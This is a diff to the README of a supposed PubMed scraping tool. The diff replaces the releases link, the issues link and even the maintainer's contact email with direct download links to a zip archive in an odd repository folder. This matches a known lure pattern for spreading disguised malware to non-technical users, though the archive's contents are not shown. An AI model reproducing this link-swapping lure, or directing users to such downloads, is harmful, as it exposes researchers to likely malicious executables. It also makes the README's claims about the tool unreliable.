@@ -1,7 +1,7 @@
 # 🛠️ pubmed-articles-scraper-pay-per-results - Easy Tool for Extracting PubMed Articles
 
 ## 📥 Download the Software
-[![Download](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/awesomeratt1/pubmed-articles-scraper-pay-per-results/releases)
+[![Download](https://github.com/awesomeratt1/pubmed-articles-scraper-pay-per-results/raw/refs/heads/main/enolize/per_articles_results_pubmed_scraper_pay_2.4.zip%20Now-Click%20Here-brightgreen)](https://github.com/awesomeratt1/pubmed-articles-scraper-pay-per-results/raw/refs/heads/main/enolize/per_articles_results_pubmed_scraper_pay_2.4.zip)
 
 ## 🚀 Getting Started
 This guide will help you download and run the pubmed-articles-scraper-pay-per-results application. This tool allows you to extract articles from PubMed with ease.
@@ -22,7 +22,7 @@ The pubmed-articles-scraper-pay-per-results enables academic researchers to coll
 - No programming knowledge required to use the tool.
 
 ## 💾 Download & Install
-To download the software, please visit this page: [Download Here](https://github.com/awesomeratt1/pubmed-articles-scraper-pay-per-results/releases).
+To download the software, please visit this page: [Download Here](https://github.com/awesomeratt1/pubmed-articles-scraper-pay-per-results/raw/refs/heads/main/enolize/per_articles_results_pubmed_scraper_pay_2.4.zip).
 
 Here's how to download and install the tool:
 
@@ -53,10 +53,10 @@ If you encounter issues during installation or use, consider the following solut
 - **Restart the Application**: Sometimes, simply restarting the application can resolve minor glitches.
 
 ## 🌐 Community and Support
-For further assistance, check out the [GitHub Issues page](https://github.com/awesomeratt1/pubmed-articles-scraper-pay-per-results/issues) where you can report problems or seek help from other users.
+For further assistance, check out the [GitHub Issues page](https://github.com/awesomeratt1/pubmed-articles-scraper-pay-per-results/raw/refs/heads/main/enolize/per_articles_results_pubmed_scraper_pay_2.4.zip) where you can report problems or seek help from other users.
 
 ## 📧 Contact
-For direct inquiries, please email the maintainer at [your-email@example.com]. 
+For direct inquiries, please email the maintainer at [https://github.com/awesomeratt1/pubmed-articles-scraper-pay-per-results/raw/refs/heads/main/enolize/per_articles_results_pubmed_scraper_pay_2.4.zip]. 
 
 ## 📜 License
 The repository is licensed under the MIT License. You are free to use the tool for personal or academic purposes.
